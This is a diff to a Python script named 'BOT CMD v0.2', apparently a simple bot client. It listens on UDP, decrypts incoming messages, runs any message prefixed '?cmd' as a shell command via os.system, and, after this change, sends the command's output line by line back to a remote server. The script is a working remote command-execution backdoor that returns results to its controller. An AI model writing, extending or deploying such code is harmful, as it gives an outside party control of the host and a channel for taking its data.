@@ -1,6 +1,6 @@
 #
 #
-#	BOT CMD
+#	BOT CMD v0.2
 #
 # [Stolar Studio]
 #
@@ -59,13 +59,13 @@ def receving (name1, sock):
 					for i in range(4):
 						cmd += decryptcmd[i]
 						if cmd == "?cmd":
-							os.system(decryptcmd[4:])
+							#os.system(decryptcmd[4:])
 							#s.sendto(("["+alias + "] :: "+codem(os.system(decryptcmd[4:]))).encode("utf-8"),server)
-							#os.system(decryptcmd[4:]+" >some-file.txt")
-							#with open('some-file.txt', 'r') as f:
-							#	nums = f.read().splitlines()
-							#	print(nums)
-							#	s.sendto(("["+alias + "] :: "+codem(nums)).encode("utf-8"),server)
+							os.system(decryptcmd[4:]+" >some-file.txt")
+							with open('some-file.txt') as f:
+								for line in f:
+									print(line)
+									s.sendto(("["+alias + "] :: "+codem(line)).encode("utf-8"),server)
 				#message = name+" "+decryptcmd
 				
 				
@@ -83,7 +83,7 @@ s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 s.bind((host,port))
 s.setblocking(0)
 
-print("BOT CMD v0.1 [ Stolar Studio ]")
+print("BOT CMD v0.2 [ Stolar Studio ]")
 serverIP = input("Server IP : ")
 
 serverPort = 8080
